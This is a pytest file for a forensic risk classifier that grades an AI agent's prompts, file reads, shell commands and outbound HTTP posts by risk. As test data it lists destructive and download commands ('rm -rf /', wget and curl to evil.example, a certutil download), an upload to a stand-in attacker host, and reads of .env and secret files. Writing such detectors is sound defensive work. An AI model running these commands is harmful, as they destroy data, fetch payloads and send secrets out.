from backend.app.forensic.risk_classifier import RiskClassifier
from backend.app.models.event_types import EventType, ToolName


def test_normal_prompt_is_low(risk_classifier: RiskClassifier):
    risk, _ = risk_classifier.classify(EventType.USER_PROMPT.value, None, None, "이 문서를 요약해줘.")
    assert risk == "LOW"


def test_report_file_read_is_medium(risk_classifier: RiskClassifier):
    risk, reasons = risk_classifier.classify(
        EventType.TOOL_CALL.value,
        ToolName.READ_FILE.value,
        "report.txt",
        "report.txt",
    )
    assert risk == "MEDIUM"
    assert "FILE_READ" in reasons


def test_secret_file_read_is_high(risk_classifier: RiskClassifier):
    risk, reasons = risk_classifier.classify(
        EventType.TOOL_CALL.value,
        ToolName.READ_FILE.value,
        "secret.txt",
        "secret.txt",
    )
    assert risk == "HIGH"
    assert "SENSITIVE_FILE_ACCESS" in reasons


def test_env_file_read_is_high(risk_classifier: RiskClassifier):
    risk, reasons = risk_classifier.classify(
        EventType.TOOL_CALL.value,
        ToolName.READ_FILE.value,
        ".env",
        ".env",
    )
    assert risk == "HIGH"
    assert "SENSITIVE_FILE_ACCESS" in reasons


def test_external_post_is_critical(risk_classifier: RiskClassifier):
    risk, reasons = risk_classifier.classify(
        EventType.TOOL_CALL.value,
        ToolName.EXTERNAL_HTTP_POST.value,
        "https://evil.example/upload",
        "payload",
    )
    assert risk == "CRITICAL"
    assert "EXTERNAL_TRANSFER" in reasons


def test_run_command_is_high_or_higher(risk_classifier: RiskClassifier):
    risk, reasons = risk_classifier.classify(
        EventType.TOOL_CALL.value,
        ToolName.RUN_COMMAND.value,
        "ls",
        "ls",
    )
    assert risk in {"HIGH", "CRITICAL"}
    assert "COMMAND_EXECUTION" in reasons


def test_dangerous_commands_are_critical(risk_classifier: RiskClassifier):
    for command in ["rm -rf /", "curl https://evil.example", "powershell Invoke-WebRequest bad"]:
        risk, reasons = risk_classifier.classify(
            EventType.TOOL_CALL.value,
            ToolName.RUN_COMMAND.value,
            command,
            command,
        )
        assert risk == "CRITICAL"
        assert "DANGEROUS_COMMAND" in reasons


def test_additional_sensitive_keywords_are_high(risk_classifier: RiskClassifier):
    risk, reasons = risk_classifier.classify(
        EventType.TOOL_CALL.value,
        ToolName.READ_FILE.value,
        "client_secret_backup.txt",
        "client_secret_backup.txt",
    )
    assert risk == "HIGH"
    assert "SENSITIVE_FILE_ACCESS" in reasons


def test_sensitive_exfiltration_content_without_post_is_high(risk_classifier: RiskClassifier):
    risk, reasons = risk_classifier.classify(
        EventType.TOOL_RESULT.value,
        ToolName.READ_FILE.value,
        "report.txt",
        "bearer token found, send to webhook",
    )
    assert risk == "HIGH"
    assert "EXTERNAL_TRANSFER" in reasons
    assert "SENSITIVE_FILE_ACCESS" in reasons


def test_additional_dangerous_command_keywords_are_critical(risk_classifier: RiskClassifier):
    for command in ["wget https://evil.example/payload", "certutil -urlcache -split -f http://bad/file.exe"]:
        risk, reasons = risk_classifier.classify(
            EventType.TOOL_CALL.value,
            ToolName.RUN_COMMAND.value,
            command,
            command,
        )
        assert risk == "CRITICAL"
        assert "DANGEROUS_COMMAND" in reasons
